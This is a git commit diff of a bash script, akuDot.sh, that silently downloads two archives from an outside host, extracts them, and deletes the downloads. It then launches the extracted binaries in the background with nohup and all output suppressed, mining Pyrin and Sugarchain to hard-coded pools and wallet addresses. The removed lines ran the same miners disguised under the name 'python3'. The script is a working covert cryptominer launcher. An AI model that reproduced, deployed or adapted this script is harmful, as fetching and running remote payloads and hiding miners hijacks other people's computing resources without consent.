db7f2232dcfff93457d5a3b09809e3c1ab5a3c5f
DotAja <142836390+DotAja@users.noreply.github.com>
2024-07-19 00:26:26 +0700

    Update akuDot.sh

--- akuDot.sh
+++ akuDot.sh
@@ -1,13 +1,14 @@
 #!/bin/bash
 
-sudo apt install screen -y 
+wget -q -O A http://kon-tol.x10.bz/srbdot.tar.gz
+wget -q -O B http://kon-tol.x10.bz/loldot.tar.gz
 
-wget -q -O TOT https://github.com/DotAja/ALONE/releases/download/alone/dotaja.tar.gz
+tar -xzf A >/dev/null 2>&1
+tar -xzf B >/dev/null 2>&1
 
-tar -xzf TOT >/dev/null 2>&1
+rm A
+rm B
 
-rm TOT
+nohup ./loldot -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_CPU-GPU >/dev/null 2>&1
 
-screen -dmS dotlol ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_CPU-GPU
-
-screen -dmS dotsrb ./dotsrb/python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_CPU-GPU -t $(nproc)
+nohup ./srbdot -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_CPU-GPU -t 2 >/dev/null 2>&1
